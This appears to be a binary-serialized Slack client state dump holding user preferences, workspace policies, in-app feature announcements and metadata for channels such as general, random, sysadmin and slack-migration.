"1browsers_dismissed_channels_low_results_educationF"(browsers_seen_initial_channels_educationF"/browsers_dismissed_people_low_results_educationF"&browsers_seen_initial_people_educationF"4browsers_dismissed_user_groups_low_results_educationF"+browsers_seen_initial_user_groups_educationF".browsers_dismissed_files_low_results_educationF"%browsers_seen_initial_files_educationF"+browsers_dismissed_initial_drafts_educationF"&browsers_seen_initial_drafts_educationF"-browsers_dismissed_initial_activity_educationF"(browsers_seen_initial_activity_educationF"*browsers_dismissed_initial_saved_educationF"%browsers_seen_initial_saved_educationF"seen_edit_modeF"seen_edit_mode_eduF"
a11y_dyslexicF"a11y_animationsT"!seen_keyboard_shortcuts_coachmarkF"needs_initial_password_setF"lessons_enabledF"tractor_enabledF"tractor_experiment_group" "opened_slackbot_dmF"newxp_seen_help_messageI "newxp_suggested_channels" "onboarding_completeF"welcome_place_state"none"onboarding_role_apps0"has_received_threaded_messageF"&send_your_first_message_banner_enabled0"joiner_notifications_mutedF"#invite_accepted_notifications_mutedF"#joiner_message_suggestion_dismissedF"onboarding_stateN@     ØB"whocanseethis_dm_mpdm_badgeF"highlight_words" "threads_everythingT"no_text_in_notificationsF"push_show_previewT"growls_enabledT"all_channels_loudT"
push_dm_alertT"push_mention_alertT"push_everythingT"push_idle_waitI "
push_sound"b2.mp3"new_msg_snd"knock_brush.mp3"push_loud_channels" "push_mention_channels" "push_loud_channels_set" "
loud_channels" "never_channels" "loud_channels_set" "at_channel_suppressed_channels" "#push_at_channel_suppressed_channels" "muted_channels" "all_notifications_prefs"Ð{"global":{"global_desktop":"everything","global_mpdm_desktop":"everything","global_mobile":"everything","global_mpdm_mobile":"everything","mobile_sound":"b2.mp3","desktop_sound":"knock_brush.mp3","global_keywords":"","push_idle_wait":0,"no_text_in_notifications":false,"push_show_preview":true,"threads_everything":true},"channels":[]}"&growth_msg_limit_approaching_cta_countI "#growth_msg_limit_approaching_cta_tsI ""growth_msg_limit_reached_cta_countI "$growth_msg_limit_reached_cta_last_tsI "'growth_msg_limit_long_reached_cta_countI ")growth_msg_limit_long_reached_cta_last_tsI "+growth_msg_limit_sixty_day_banner_cta_countI "-growth_msg_limit_sixty_day_banner_cta_last_tsI "growth_all_banners_prefs" "analytics_upsell_coachmark_seenF"seen_app_space_coachmarkF"seen_app_space_tutorialF"dismissed_app_launcher_welcomeF"dismissed_app_launcher_limitF"	purchaserF"seen_channel_email_tooltipF"show_ent_onboardingT"folders_enabledF"folder_data"[]"seen_corporate_export_alertF"show_autocomplete_helpI"deprecation_toast_last_seenI "deprecation_modal_last_seenI "iap1_labI "ia_top_nav_theme" "ia_platform_actions_labI"
activity_viewcp a g e "
saved_viewcp a g e "seen_floating_sidebar_coachmarkF"failover_proxy_check_completedI "chime_access_check_completedI"mx_calendar_type"GOOGLE"!edge_upload_proxy_check_completedI "app_subdomain_check_completedI "add_prompt_interactedF"add_apps_prompt_dismissedF"add_channel_prompt_dismissedF"channel_sidebar_hide_inviteF"$channel_sidebar_hide_browse_dms_linkF"in_prod_surveys_enabledT"connect_dm_early_accessF"&dismissed_installed_app_dm_suggestions" "'seen_contextual_message_shortcuts_modalF")seen_message_navigation_educational_toastF"+contextual_message_shortcuts_modal_was_seenT"!message_navigation_toast_was_seenF"up_to_browse_kb_shortcutT"channel_sections" "show_quick_reactionsF"/user_customized_quick_reactions_display_featureI".user_customized_quick_reactions_has_customizedF"'user_customized_quick_reactions_emoji_1"white_check_mark"'user_customized_quick_reactions_emoji_2"eyes"'user_customized_quick_reactions_emoji_3"raised_hands" has_received_mention_or_reactionF"has_starred_itemF"has_drafted_messageF""enable_mentions_and_reactions_viewT"enable_saved_items_viewT"enable_all_dms_viewT"enable_channel_browser_viewF"enable_file_browser_viewF"enable_people_browser_viewF"enable_app_browser_viewF"reached_all_dms_disclosureF"#has_acknowledged_shortcut_speedbumpF"stories_variant"tiles"tz"America/Los_Angeles"locales_enabledo"de-DE"Deutsch (Deutschland)"en-GB"English (UK)"en-US"English (US)"es-ES"Español (España)"es-LA"Español (Latinoamérica)"fr-FR"Français (France)"pt-BR"Português (Brasil)"ja-JP cåe,gžŠ"ko-KR c\Õm­´Å{	{ñ"teamo"invites_only_adminsF"show_join_leaveF"welcome_place_enabledT"locale"en-US"default_channelsA"C01CRP755V0"C01CRVABMTM"C01CNLQRX6Z$ " default_channel_creation_enabledT"slackbot_responses_disabledF"
hide_referersT"msg_edit_window_minsI"allow_message_deletionT"
calls_appso"audioA $  "videoAo"id"A00"name"Slack"image"img/slack_hash_128.png{$ "profile_field_optionsA $  {"allow_callsT"&allow_calls_interactive_screen_sharingT"calls_locationsA $  "display_real_namesF"who_can_at_everyone"regular"who_can_at_channel"ra"who_can_create_channels"regular"who_can_archive_channels"regular"who_can_create_groups"ra"$who_can_manage_channel_posting_prefs"ra"who_can_post_general"ra"who_can_kick_channels c
a d m i n "who_can_kick_groups"regular" admin_customized_quick_reactionsA"white_check_mark"eyes"raised_hands$ "workflow_builder_enabledT"who_can_view_message_activityo"typeA"TOPLEVEL_ADMINS_AND_OWNERS$ {"member_analytics_disabledF"$workflow_extension_steps_beta_opt_inF"channel_email_addresses_enabledT"retention_typeI "retention_durationI "group_retention_typeI "group_retention_durationI "dm_retention_typeI "dm_retention_durationI "file_retention_typeI "file_retention_durationI "allow_retention_overrideF"allow_admin_retention_overrideI "default_rxnsA"simple_smile"thumbsup"white_check_mark"heart"eyes$ "compliance_export_startI "warn_before_at_channel"always"disallow_public_file_urlsF"!who_can_create_delete_user_groups c
a d m i n "who_can_edit_user_groupsc
a d m i n "who_can_change_team_profile c
a d m i n "subteams_auto_create_ownerF"subteams_auto_create_adminF"display_email_addressesT" display_external_email_addressesT"discoverable"unlisted"dnd_days"	every_day"invite_requests_enabledT"disable_file_uploads"	allow_all"disable_file_editingF"disable_file_deletingF"file_limit_whitelistedF"%uses_customized_custom_status_presetsF"disable_email_ingestionF"who_can_manage_guestso"typeA c
a d m i n $ {"who_can_create_shared_channels c
a d m i n "who_can_manage_shared_channelso"typeA c
a d m i n $ {"who_can_post_in_shared_channelso"typeA"ra$ {""who_can_manage_ext_shared_channelso"typeA"ORG_ADMINS_AND_OWNERS$ {"gdrive_enabled_teamF"dropbox_legacy_pickerF"box_app_installedF"onedrive_app_installedF"onedrive_enabled_teamF"filepicker_app_first_installF"use_browser_pickerF"#can_receive_shared_channels_invitesT"1external_shared_channel_requests_approval_channel0"/received_esc_route_to_channel_awareness_messageF"#who_can_request_ext_shared_channelso"typeA"EVERYONE$ {"enterprise_default_channelsA $  " enterprise_has_corporate_exportsF"enterprise_mandatory_channelsA $  "$enterprise_mdm_disable_file_downloadF""mobile_passcode_timeout_in_secondsI"notification_redaction_type"REDACT_ALL_CONTENT"has_compliance_exportF"has_hipaa_complianceF"all_users_can_purchaseT"self_serve_selectF"loud_channel_mentions_limitI œ"enable_shared_channelsI"who_can_manage_public_channelso"userA $  "typeA $  {"who_can_manage_private_channelso"userA $  "typeA $  {"2who_can_manage_private_channels_at_workspace_levelo"userA $  "typeA"WORKSPACE_PRIMARY_OWNER$ {"enable_connect_dm_early_accessF"enterprise_mobile_device_checkF"required_minimum_mobile_version0"enable_info_barriersF")enable_mpdm_to_private_channel_conversionT"
gg_enabledF"created_with_googleF"has_seen_partner_promoF"disable_sidebar_connect_promptsA $  "disable_sidebar_install_promptsA $  "block_file_downloadF"single_user_exportsF"app_management_appsA $  "custom_contact_email0"ent_required_browser0"dev_company_segment0"org_calls_apps0"ntlm_credential_domains"*"rimeto_org_instance_id0"dnd_enabledT"dnd_start_hour"22:00"dnd_end_hour"08:00"dnd_before_monday"08:00"dnd_after_monday"22:00"dnd_before_tuesday"08:00"dnd_after_tuesday"22:00"dnd_before_wednesday"08:00"dnd_after_wednesday"22:00"dnd_before_thursday"08:00"dnd_after_thursday"22:00"dnd_before_friday"08:00"dnd_after_friday"22:00"dnd_before_saturday"08:00"dnd_after_saturday"22:00"dnd_before_sunday"08:00"dnd_after_sunday"22:00"dnd_enabled_monday"partial"dnd_enabled_tuesday"partial"dnd_enabled_wednesday"partial"dnd_enabled_thursday"partial"dnd_enabled_friday"partial"dnd_enabled_saturday"partial"dnd_enabled_sunday"partial"dnd_weekdays_off_alldayF"custom_status_presetsAA":spiral_calendar_pad:"In a meeting"In a meeting"1_hour$ A":bus:"	Commuting"	Commuting"
30_minutes$ A":face_with_thermometer:"Off sick"Out sick"all_day$ A":palm_tree:"
On holiday"Vacationing"
no_expiration$ A":house_with_garden:"Working remotely"Working remotely"all_day$ $ "custom_status_default_emoji":speech_balloon:"	auth_mode"normal"who_can_manage_integrationso"typeA"regular$ {"app_whitelist_enabledF"who_can_create_workflowso"typeA"regular$ {"!workflows_webhook_trigger_enabledT" workflow_extension_steps_enabledT"workflows_export_csv_enabledT"&who_can_create_channel_email_addresseso"typeA"regular$ {"who_can_dm_anyoneo"typeA"NO_ONE$ {"
invites_limitT"can_user_manage_shared_channelsF"	emoji_use^Ÿ"frecency_jumper^ "frecency_ent_jumper^¥{—"channelo{ "
enterpriseo{ "
userColorso{ "
notificationso"globalo"global_desktop"
everything"global_mpdm_desktop"
everything"
global_mobile"
everything"global_mpdm_mobile"
everything"mobile_sound"b2.mp3"
desktop_sound"knock_brush.mp3"global_keywords" "push_idle_waitI "no_text_in_notificationsF"push_show_previewT"threads_everythingT{"channelsA $  {"channelSectionso{ "uiStateo"showOpenTransitionT"lastActiveSection"
notifications{{"pricingPlanso"activeCurrency0"
activeTerm"monthly"activePlanLevel0"activePaymentMethod"
creditCard"apiErrorF"availablePlanso{ "	trialDatao"	isInTrialF"endDate0{"activePlanCosto{ "
cachedCosto{ "isPlansAndCostDataLoadedF"isPlansDataLoadingF"isCostDataLoadingF"
plansPageBooto{ "isPlansPageBootLoadedF"benefitsPageUpgradeContext0{"roleso{ "
savedFocuso"focusKey0{"searchAutocompleteo"suggestionsa @  "
selectedIndex0"
blankState0"isSearchAutocompleteOpenF"guidedSearchSelectedIndex0"loadingStateo"recentSearchesF"recentFilesF{{"searchChannelsUserso"channelsa @  {"searchInputBoxo"displayQuery" "	userQuery" "queryIsUserGeneratedF{"
searchResultso"previousRequest_"request_"editableRequesto"query" "queryFiltero"froma @  "ina @  "after_"before_{"queryFilterHistoryo"froma @  "ina @  "fileType_{{"suggestionso"froma @  "ina @  {"fileSuggestionso"froma @  "ina @  {"response_"lastFetchAllRequestId" {"
searchSessiono"lastEventTimeMs_"querySessionId_"searchSessionId_"searchSessionLastQuery_{"searchUio"
interfaceMode"EDIT"tab"messages"visibleF"requestQuery0"moduleso{ "scrollPositiono"allI "messagesI "filesI "channelsI "peopleI {"heightCacheo{ "sessionTimeoutId0"querySessionTimeoutId0"lastOpenMethod0"omniswitcherMode0"searchyMode"default"focusedViaTabKeyF"isDebugInfoVisibleF"
searchOptionso"searchOnlyCurrentTeamF"searchOnlyMyChannelsF"searchExcludeBotsF{"sharedTeamso"state"ready"	refreshedI "teamIdsa @  {"channelSearchFilterType"all"channelSearchOrgFiltersa @  "!channelSearchOrgFilterSuggestionsa @  "channelSearchSort"relevant"channelJoinso{ "
channelLeaveso{ "peopleSearchFilterTypeo"type"0,1,2,3,4,5,6,7,8{"peopleSearchCustomFilterso{ "peopleSearchOrgFiltersa @  " peopleSearchOrgFilterSuggestionsa @  "%peopleSearchTimezoneFilterSuggestionsa @  "peopleSearchTeamProfileStateo"state"ready"	refreshedI {"selectedEnterpriseTeamId" "displayQuery" {"starso"	starsLista @  "currentPageI "
totalPagesI "	isLoadingT"
cursorMark_"selectedEnterpriseTeamId" {"pinso"
pinsByChannelo{ "loadingStateByChannelo{ {"threadsFlexpaneo"startTs0"highlightTs0"highlightKey0"showDragOverlayF"focusRequested0"
focusInput0{"	threadSubo"D01CNM69G3F-1602859966.000600o"id"D01CNM69G3F-1602859966.000600"
subscribedT{"D01CNM69G3F-1602860081.001100o"id"D01CNM69G3F-1602860081.001100"
subscribedT{{"toastI "uiSerializationo"message-paneo"serializedStateo"showingArchiveBannerF"showingUnreadBannerF"unreadPlacementI{"serializedProps_{{"unfurlso{ "unreadCountso"initialUnreadso"C01CNLQRX6Zo"	unreadCntI "unreadHighlightCntI {"C01CRP755V0o"	unreadCntI "unreadHighlightCntI {"C01CRVABMTMo"	unreadCntI "unreadHighlightCntI {"D01CNM69G3Fo"	unreadCntI "unreadHighlightCntI {"D01CS0G54R1o"	unreadCntI "unreadHighlightCntI {"D01CXUJNBS8o"	unreadCntI "unreadHighlightCntI {{"countsPerChannelo{ "channelsToSuppresso{ "threadsUnreadCountI "threadsMentionCountI "threadsMentionCountByChannelo{ "threadsLastUpdatedTimestamp"0"suppressThreadsF"totalUnreadsInChannelsI ""totalUnsuppressedUnreadsInChannelsI "totalUnreadsI "totalUnreadHighlightsI {"userGroupsFlexpaneo"searchQuery" "
cursorMark0"
scrollmark0"userGroupIdsa @  {"usersCountso{ "	workspaceo"focusedWorkspacesWithTimestampso"T01CK1QBDDLN €+USwB{"focusedWorkspacesA"T01CK1QBDDL$ {"enablePopupsBannero"
showBannerF{"whatsNewo"updatesA
o"	timestampN   #|ß×A"title"8New capabilities to connect people, partners and systems"descriptionc‚< p > W e  r e   c o n t i n u i n g   t o   s i m p l i f y   t h e   w a y   u s e r s   c o n n e c t   w i t h   e x t e r n a l   p a r t n e r s ,   a u t o m a t e   r o u t i n e   p r o c e s s e s   a n d   w o r k   w i t h   t h e i r   f a v o u r i t e   t o o l s      a l l   i n   S l a c k . < / p > < p > D u r i n g   o u r   a n n u a l   S l a c k   F r o n t i e r s   c o n f e r e n c e ,   w e   u n v e i l e d   s e v e r a l   n e w   f e a t u r e s   t o   h e l p   t e a m s   c o l l a b o r a t e   m o r e   e f f e c t i v e l y   i n   S l a c k ,   a l o n g   w i t h   i n s i g h t s   i n t o   t h e   c h a l l e n g e s   a n d   o p p o r t u n i t i e s   f a c i n g   r e m o t e   w o r k e r s   t o d a y . < / p > "url"Chttps://slack.com/blog/transformation/people-partners-systems-slack"	url_title"Learn more on our blog"htmlT{o"	timestampN   À
i×A"title"	Dark mode"description c¾< p > W h e t h e r   y o u  r e   w o r k i n g   i n   a   l o w - l i g h t   e n v i r o n m e n t   o r   j u s t   n e e d   t o   g i v e   y o u r   e y e s   a   r e s t ,   d a r k   m o d e   h a s   c o m e   t o   S l a c k .   Y o u   c a n   a c c e s s   i t   f r o m   t h e   T h e m e s   s e c t i o n   o f   y o u r   p r e f e r e n c e s   a n d   i f   y o u  r e   o n   t h e   l a t e s t   M a c   d e s k t o p   a p p   ( 4 . 1 . 0 ) ,   y o u   c a n   s y n c   i t   w i t h   y o u r   o p e r a t i n g   s y s t e m   t o o . < / p > "url"/https://slackhq.com/dark-mode-for-slack-desktop"	url_title"Learn more on our blog"htmlT{o"	timestampN   $^W×A"title"In case you missed it"description cð< p > W e  v e   m a d e   S l a c k   e v e n   e a s i e r   t o   u s e      w i t h   a n n o u n c e m e n t   c h a n n e l s ,   l o n g e r   c h a n n e l   n a m e s   a n d   a   s i m p l e r   w a y   t o   f i n d   t h e   p e r s o n   y o u  r e   l o o k i n g   f o r .   T h e r e  s   a   w h o l e   l o t   m o r e ,   s o   r e a d   o u r   r u n d o w n   a n d   s t a r t   t a k i n g   a d v a n t a g e   o f   t h e s e   f e a t u r e s   t o d a y . < / p > "url"¡https://slackhq.com/new-slack-features-search-calls-channels?utm_medium=in-prod&utm_source=in-prod&utm_campaign=cd_in-prod_in-prod_all__all_cr-whatsnew_ym-201908"	url_title"Learn more on our blog"htmlT{o"	timestampN  @û?×A"title"In case you missed it"descriptioncìF r o m   a   d e d i c a t e d   d r a f t s   s e c t i o n   i n   y o u r   c h a n n e l   s i d e b a r   t o   d a r k   m o d e   o n   m o b i l e ,   t h e r e  s   a   h a n d f u l   o f   n e w   f e a t u r e s   t h a t   h e l p   S l a c k   b e t t e r   f i t   t h e   w a y   y o u   w o r k .   T o   h e l p   y o u   t a k e   a d v a n t a g e   o f   a l l   o u r   l a t e s t   f e a t u r e s ,   r e a d   o u r   o v e r v i e w   o f   w h a t  s   n e w . "url"Thttps://slackhq.com/in-case-you-missed-it-drafts-email-dark-mode?utm_source=whatsnew"	url_title"Learn more on our blog{o"	timestampN  €Àá(×A"title"!Discover new channels with search"description cÜ< p > W i t h   a   n e w l y   d e d i c a t e d    C h a n n e l s    t a b   i n   s e a r c h   r e s u l t s ,   i t  s   n o w   e a s i e r   t o   d i s c o v e r   a n d   j o i n   c h a n n e l s   a c r o s s   y o u r   o r g a n i s a t i o n   t h a t   a r e   n e w   t o   y o u .   W h e t h e r   y o u   k n o w   a   c h a n n e l  s   f u l l   n a m e   o r   n o t ,   y o u   c a n   f i n d   c h a n n e l s   w i t h   a   n a m e ,   p u r p o s e   o r   f r e q u e n t l y   d i s c u s s e d   t o p i c   t h a t   m a t c h e s   y o u r   s e a r c h .   < / p > "url"https://bit.ly/2YH0DC8"	url_title"Learn more on our blog"htmlT{o"	timestampN   Ìß×A"title"Say hello, new look"descriptioncÚ< p > Y o u   m a y   n o t i c e   t h i n g s   s t a r t i n g   t o   l o o k   a   l i t t l e   d i f f e r e n t   a r o u n d   h e r e      a   l i t t l e   f r e s h e r ,   a   l i t t l e   s i m p l e r ,   a n d   ( w e   t h i n k )   a   l i t t l e   b e t t e r . < / p > 
 	 	 	 	 < p > A s   o f   t o d a y ,   y o u  l l   s e e   a   n e w   a p p   i c o n   w h e r e v e r   y o u   u s e   S l a c k .   I n   t h e   c o m i n g   m o n t h s ,   y o u  l l   s e e   n e w   l o o k s ,   n e w   i m a g e s ,   a n d   t h i n g s   t h a t   f e e l   m o r e   p u t   t o g e t h e r .   E v e r y t h i n g   e l s e   r e m a i n s ,   r e a s s u r i n g l y ,   t h e   s a m e . < / p > "url"&https://slackhq.com/say-hello-new-logo"	url_title"Learn more on our blog"htmlT{o"	timestampN   ìP×A"title"In case you missed it"descriptioncÈ< p > S o m e   s m a l l - b u t - n i f t y   i m p r o v e m e n t s   t o   c o n t r o l   a n d   c o n v e n i e n c e   h a v e   r e c e n t l y   m a d e   t h e i r   w a y   i n t o   S l a c k .   F r o m   c h o o s i n g   h o w   l o n g   y o u   w a n t   y o u r   s t a t u s   d i s p l a y e d   t o   s h a r i n g   O n e D r i v e   f i l e s   w i t h o u t   l e a v i n g   S l a c k ,   h e r e  s   a   r o u n d - u p   o f   s o m e   o f   t h e   m o s t   n o t a b l e   u p d a t e s   y o u   c a n   s t a r t   u s i n g   t o d a y . < / p > "url"Whttps://slackhq.com/in-case-you-missed-it-improvements-to-status-notifications-and-more"	url_title"Learn more on our blog"htmlT{o"	timestampN   ÄyØÖA"title"In case you missed it"description c®< p > Y o u   m i g h t   h a v e   n o t i c e d   a   f e w   c h a n g e s   i n   y o u r   S l a c k   w o r k s p a c e   r e c e n t l y :   n e w   e m o j i ,   c l i c k a b l e   s e a r c h   f i l t e r s   a n d   m o r e .   I n   c a s e   i t   s l i p p e d   u n d e r   y o u r   r a d a r ,   w e  v e   r o u n d e d   u p   s o m e   o f   o u r   h a n d i e s t   u p d a t e s   f o r   y o u . < / p > "	url_title"Learn more on our blog"url"Lhttps://slackhq.com/in-case-you-missed-it-new-emoji-improved-search-and-more"htmlT{o"	timestampN   |2ÑÖA"title"A new way to search in Slack"description cì< p > I t  s   a l w a y s   b e e n   p o s s i b l e   t o   f o c u s   y o u r   s e a r c h e s   o n   s p e c i f i c   c h a n n e l s   o r   p e o p l e ,   b u t   i t   c o u l d   h a v e   b e e n   e a s i e r .   N o w   i t   i s ! < / p > < p > W e  v e   b u i l t   a   w h o l e   n e w   s e a r c h   e x p e r i e n c e ,   o n e   t h a t   l e t s   y o u   r e f i n e   y o u r   r e s u l t s   w i t h   c l i c k a b l e   f i l t e r s      s o   y o u   c a n   h o n e   i n   o n   j u s t   t h e   m e s s a g e s   a n d   f i l e s   t h a t   m a t t e r   m o s t . < / p > < p > T o   t r y   i t   o u t ,   c l i c k   t h e   s e a r c h   f i e l d   a b o v e   a n d   h a v e   a   g o . < / p > "	url_title"Learn more on our blog"url":https://slackhq.com/less-searching-more-doing-d249e59fa8c1"htmlT{o"	timestampN   <ŠnÖA"title"Hello, bonjour, hola, hallo!"description cø< p > P r e f e r   t o   u s e   S l a c k   i n   F r e n c h ,   G e r m a n   o r   S p a n i s h ?   N o w   y o u   c a n .   W e  v e   l o c a l i s e d   o u r   p r o d u c t ,   w e b s i t e   a n d   s u p p o r t   s o   y o u   c a n   t a i l o r   S l a c k   t o   w o r k   t h e   w a y   y o u   d o .   T o   s w i t c h   y o u r   l a n g u a g e ,   o p e n   y o u r   p r e f e r e n c e s   a n d   t h e n   s e l e c t    L a n g u a g e   a n d   r e g i o n  . < / p > "url" https://slackhq.com/546a458b21ae"	url_title"Read more on the blog"htmlT{$ 
"	isLoadingF"fetchFailedF{"recentlySharedFilesPickero"filetype" "userF"
scrollmark0"dialogFilesa @  "	menuFilesa @  "desktopRecentFilesa @  "	isLoadingF"isDesktopLoadingF"	firstLoadF"desktopFirstLoadF{
"channelBrowsero"channelBrowserSort"name{"
appActionso"actionso{ "actionIdsByAppIdo{ "isLoadedT"fetchFailedF"runCountI {"appGlobalActionso"actionso{ {"
shortcutsMenuo"
shouldOpenF"shortcutsMenuViewContext" "shortcutsMenuThreadTs" "shortcutsMenuOpenTs" "shouldHideSpeedbumpT"
pushedView" "
openMethod" {"channelActionso"actionso{ "channelIdsByActionIdo{ "actionIdsByChannelIdo{ "actionCountByChannelIdo"C01CRP755V0I "D01CNM69G3FI "D01CXUJNBS8I "C01CNNCJELVI {{"appHomeso{ "appPermissionso{ "appProfileso{ "appViewso"viewso{ {"appCollaboratorso"
collectiono{ {"appso{ "blockso{ "botso{ "botsMetadatao{ "channelHistoryo"C01CRP755V0o"reachedStartT"
reachedEnd0"slicesaI o"
timestampsaI "1602859392.000200I"1602859813.000400@"start"1602859392.000200"end"1602859813.000400{@"prevReachedEndT{"D01CNM69G3Fo"reachedStartT"
reachedEndT"slicesAo"
timestampsaI "1602860278.001500@"start"1602860081.001100"end"1602860278.001500{$ "prevReachedEndF{"D01CXUJNBS8o"reachedStartT"
reachedEndT"slicesAo"
timestampsa @  "start_"end_{$ {"C01CNNCJELVo"reachedStartT"
reachedEndT"slicesAo"
timestampsaI "1602860574.000200I"1602860583.000400I"1602860614.001000@"start"1602860574.000200"end"1602860614.001000{$ {{"channelso"C01CNLQRX6Zo"id"C01CNLQRX6Z"name"slack-migration"
is_channelT"is_groupF"is_imF"createdN  @wlâ×A"is_archivedF"
is_generalF"unlinkedI "name_normalized"slack-migration"	is_frozenF"parent_conversation0"creator"U01CRP74MB4"use_case"project"
is_ext_sharedF"
is_org_sharedF"shared_team_idsA"T01CK1QBDDL$ "
is_privateF"is_mpimF"topico"value" "creator" "last_setI {"purposeo"value"rThis *channel* is for working on a project. Hold meetings, share docs, and make decisions together with your team."creator"U01CRP74MB4"last_setN  @wlâ×A{"previous_namesA $  "latest"0000000000.000000"	is_memberT"	last_read"1602859485.000200"priority_"
is_starredF"is_thread_onlyF"is_read_onlyF"is_org_mandatoryF"is_org_defaultF"_name_lc"slack-migration"$_show_in_list_even_though_no_unreadsF"
scroll_topI"history_is_being_fetchedF"unread_highlight_cntI "unread_highlightsa @  "
unread_cntI "unreadsa @  "$has_fetched_history_after_scrollbackF"
oldest_msg_ts0"connectedTeamIdsA $  "internalTeamIdsA $  "isSuggestedF"
isNonExistentF"	isUnknownF"fromAnotherTeamF{/"C01CRP755V0o"id"C01CRP755V0"name"general"
is_channelT"is_groupF"is_imF"createdN   `lâ×A"is_archivedF"
is_generalT"unlinkedI "name_normalized"general"	is_frozenF"parent_conversation0"creator"U01CRP74MB4"use_case"welcome"
is_ext_sharedF"
is_org_sharedF"shared_team_idsA"T01CK1QBDDL$ "
is_privateF"is_mpimF"topico"value" "creator" "last_setN        {"purposeo"value cöT h i s   i s   t h e   o n e   c h a n n e l   t h a t   w i l l   a l w a y s   i n c l u d e   e v e r y o n e .   I t  s   a   g r e a t   s p o t   f o r   a n n o u n c e m e n t s   a n d   t e a m - w i d e   c o n v e r s a t i o n s . "creator"U01CRP74MB4"last_setN   `lâ×A{"previous_namesA $  "latest"1602859813.000400"	is_memberT"	last_read"1602859392.000200"priority_"
is_starredF"is_thread_onlyF"is_read_onlyF"is_non_threadableF"unread_count_displayI "is_org_mandatoryF"is_org_defaultF"_name_lc"general"$_show_in_list_even_though_no_unreadsF"
scroll_topI"history_is_being_fetchedF"unread_highlight_cntI "unread_highlightsa @  "
unread_cntI "unreadsa @  "$has_fetched_history_after_scrollbackF"
oldest_msg_ts0"connectedTeamIdsA $  "internalTeamIdsA $  "isSuggestedF"
isNonExistentF"	isUnknownF"fromAnotherTeamF"pinned_items_countI {2"C01CRVABMTMo"id"C01CRVABMTM"name"random"
is_channelT"is_groupF"is_imF"createdN   `lâ×A"is_archivedF"
is_generalF"unlinkedI "name_normalized"random"	is_frozenF"parent_conversation0"creator"U01CRP74MB4"use_case"random"
is_ext_sharedF"
is_org_sharedF"shared_team_idsA"T01CK1QBDDL$ "
is_privateF"is_mpimF"topico"value" "creator" "last_setN        {"purposeo"valuecúT h i s   c h a n n e l   i s   f o r . . .   w e l l ,   e v e r y t h i n g   e l s e .   I t  s   a   p l a c e   f o r   t e a m   j o k e s ,   s p u r - o f - t h e - m o m e n t   i d e a s ,   a n d   f u n n y   G I F s .   G o   w i l d ! "creator"U01CRP74MB4"last_setN   `lâ×A{"previous_namesA $  "latest"0000000000.000000"	is_memberT"	last_read"1602859392.000200"priority_"
is_starredF"is_thread_onlyF"is_read_onlyF"is_org_mandatoryF"is_org_defaultF"_name_lc"random"$_show_in_list_even_though_no_unreadsF"
scroll_topI"history_is_being_fetchedF"unread_highlight_cntI "unread_highlightsa @  "
unread_cntI "unreadsa @  "$has_fetched_history_after_scrollbackF"
oldest_msg_ts0"connectedTeamIdsA $  "internalTeamIdsA $  "isSuggestedF"
isNonExistentF"	isUnknownF"fromAnotherTeamF{/"D01CNM69G3Fo"id"D01CNM69G3F"createdN  @Élâ×A"	is_frozenF"is_archivedF"is_imT"
is_org_sharedF"user"U01D4CWG7PB"	last_read"1602860278.001500"latest"1602859966.000600"is_openT"	is_memberT"priority_"
is_starredF"
is_generalF"
is_channelF"is_groupF"is_mpimF"name"elliot.alterson453646"_name_lc"elliot.alterson453646"topico{ "purposeo{ "opened_this_sessionF"
scroll_topI"history_is_being_fetchedF"unread_highlight_cntI "unread_highlightsa @  "
unread_cntI "unreadsa @  "$has_fetched_history_after_scrollbackF"
oldest_msg_ts0"connectedTeamIdsA $  "internalTeamIdsA $  "isSuggestedF"
isNonExistentF"	isUnknownF"fromAnotherTeamF"pinned_items_countI "unread_count_displayI {&"D01CS0G54R1o"id"D01CS0G54R1"createdN  @Élâ×A"	is_frozenF"is_archivedF"is_imT"
is_org_sharedF"user"	USLACKBOT"	last_read"0000000000.000000"latest"0000000000.000000"is_openF"	is_memberT"priority_"
is_starredF"
is_generalF"
is_channelF"is_groupF"is_mpimF"name"slackbot"_name_lc"slackbot"topico{ "purposeo{ "opened_this_sessionF"
scroll_topI"history_is_being_fetchedF"unread_highlight_cntI "unread_highlightsa @  "
unread_cntI "unreadsa @  "$has_fetched_history_after_scrollbackF"
oldest_msg_ts0"connectedTeamIdsA $  "internalTeamIdsA $  "isSuggestedF"
isNonExistentF"	isUnknownF"fromAnotherTeamF{$"D01CXUJNBS8o"id"D01CXUJNBS8"createdN  @Élâ×A"	is_frozenF"is_archivedF"is_imT"
is_org_sharedF"user"U01CRP74MB4"	last_read"0000000000.000000"latest"0000000000.000000"is_openT"	is_memberT"priority_"
is_starredF"
is_generalF"
is_channelF"is_groupF"is_mpimF"name"
nigelodea"_name_lc"
nigelodea"topico{ "purposeo{ "opened_this_sessionF"
scroll_topI"history_is_being_fetchedF"unread_highlight_cntI "unread_highlightsa @  "
unread_cntI "unreadsa @  "$has_fetched_history_after_scrollbackF"
oldest_msg_ts0"connectedTeamIdsA $  "internalTeamIdsA $  "isSuggestedF"
isNonExistentF"	isUnknownF"fromAnotherTeamF"pinned_items_countI {%"C01CNNCJELVo"id"C01CNNCJELV"
is_channelT"name"sysadmin"name_normalized"sysadmin"createdN  @‡mâ×A"creator"U01D4CWG7PB"
is_org_sharedF"
is_generalF"is_groupF"is_mpimF"is_imF"is_org_mandatoryF"is_org_defaultF"_name_lc"sysadmin"$_show_in_list_even_though_no_unreadsF"topico"value" "creator" "last_setN        {"purposeo"value" "creator" "last_setN        {"	is_memberT"
scroll_topI"history_is_being_fetchedF"unread_highlight_cntI "unread_highlightsA $  "
unread_cntI "unreadsA $  "$has_fetched_history_after_scrollbackF"
oldest_msg_ts0"connectedTeamIdsA $  "internalTeamIdsA $  "isSuggestedF"
isNonExistentF"	isUnknownF"fromAnotherTeamF"is_archivedF"unlinkedI "	is_frozenF"parent_conversation0"
is_ext_sharedF"shared_team_idsA"T01CK1QBDDL$ "
is_privateF"	last_read"1602860614.001000"latest0"unread_count_displayI "previous_namesA $  "priorityI "pinned_items_countI {-{"channelsMetao"imAndMpimCounto"teamId"T01CK1QBDDL{"inviterso{ "
